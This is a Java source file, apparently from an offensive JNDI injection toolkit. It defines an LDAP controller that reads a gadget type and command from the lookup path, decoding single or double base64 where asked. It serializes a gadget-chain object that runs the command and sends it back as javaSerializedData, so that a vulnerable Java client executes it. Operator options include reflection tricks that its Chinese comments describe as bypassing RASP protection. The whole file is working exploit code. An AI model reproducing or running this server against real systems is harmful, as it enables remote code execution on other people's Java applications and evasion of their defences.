package com.qi4l.jndi.controllers;

import com.qi4l.jndi.enumtypes.GadgetType;
import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.exceptions.IncorrectParamsException;
import com.qi4l.jndi.exceptions.UnSupportedGadgetTypeException;
import com.qi4l.jndi.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.ObjectPayload;
import com.qi4l.jndi.gadgets.utils.Serializer;
import com.qi4l.jndi.gadgets.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;

import java.io.ByteArrayOutputStream;
import java.util.Base64;

import static com.qi4l.jndi.gadgets.Config.Config.BCEL1;
import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/deserialization"})
public class SerializedDataController implements LdapController {
    public static String      gadgetType;
    public static String      cmd11;
    public static GadgetType  gadgetType1;
    private       PayloadType payloadType;
    private       String      params;
    public static CommandLine cmdLine;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@ Send LDAP result for" + base + " with javaSerializedData attribute"));
        System.out.println("-------------------------------------- JNDI Remote Refenrence Links --------------------------------------");
        Entry e = new Entry(base);

        byte[] bytes;

        try {
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(gadgetType);
            ObjectPayload                        payload      = payloadClass.newInstance();
            Object                               object       = payload.getObject(params);

            if (SerializedDataController.gadgetType.equals("JRE8u20")) {
                bytes = (byte[]) object;
            } else {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                bytes = Serializer.serialize(object, out);
            }

            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaSerializedData", bytes);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try {
            base = base.replace('\\', '/');
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try {
                gadgetType = base.substring(firstIndex + 1, secondIndex);
                System.out.println(ansi().render("@|green [+]|@ GaddgetType : " + gadgetType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
            }
            int    thirdIndex = base.indexOf("/", secondIndex + 1);
            int    fourIndex  = base.indexOf("/", thirdIndex + 1);
            String Ty1        = base.substring(thirdIndex + 1, fourIndex);
            gadgetType1 = GadgetType.valueOf(Ty1.toLowerCase());
            // 若第三个斜杠不存在，则把其设置成为字符串的长度
            if (thirdIndex < 0) thirdIndex = base.length();
            try {
                // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                String Ty3 = base.substring(secondIndex + 1, thirdIndex);
                payloadType = PayloadType.valueOf(Ty3.toLowerCase());
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            if (payloadType == PayloadType.sethttp) {
                params = BCEL1;
                System.out.println(ansi().render("@|green [+]|@ command：" + BCEL1));
            }

            if (payloadType == PayloadType.command) {

                if (gadgetType1 == GadgetType.base64) {
                    cmd11 = Util.getCmdFromBase(base);
                }

                if (gadgetType1 == GadgetType.base64Two) {
                    String encodedString = Util.getCmdFromBase(base);
                    byte[] decodedBytes  = Base64.getDecoder().decode(encodedString);
                    String T1            = new String(decodedBytes);
                    byte[] decodedBytes1 = Base64.getDecoder().decode(T1);
                    cmd11 = new String(decodedBytes1);
                }

                if (cmd11.contains("#")) {
                    String[] cmd11s  = cmd11.split("#");
                    String[] cmd12s  = cmd11s[1].split(" ");
                    Options  options = new Options();
                    options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
                    options.addOption("o", "obscure", false, "使用反射绕过");
                    options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
                    CommandLineParser parser = new DefaultParser();

                    try {
                        cmdLine = parser.parse(options, cmd12s);
                    } catch (Exception e) {
                        System.out.println("[*] Parameter input error, please use -h for more information");
                    }

                    params = cmd11s[0];
                    System.out.println(ansi().render("@|green [+]|@ command：" + cmd11s[0]));

                    if (cmdLine.hasOption("obscure")) {
                        Config.IS_OBSCURE = true;
                        System.out.println(ansi().render("@|green [+]|@ 使用反射绕过RASP "));
                    }

                    if (cmdLine.hasOption("AbstractTranslet")) {
                        Config.IS_INHERIT_ABSTRACT_TRANSLET = true;
                        System.out.println("[+] 继承恶意类AbstractTranslet");
                    }

                    if (cmdLine.hasOption("jboss")) {
                        Config.IS_JBOSS_OBJECT_INPUT_STREAM = true;
                    }
                } else {
                    params = cmd11;
                    System.out.println(ansi().render("@|green [+]|@ command：" + cmd11));
                }

            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
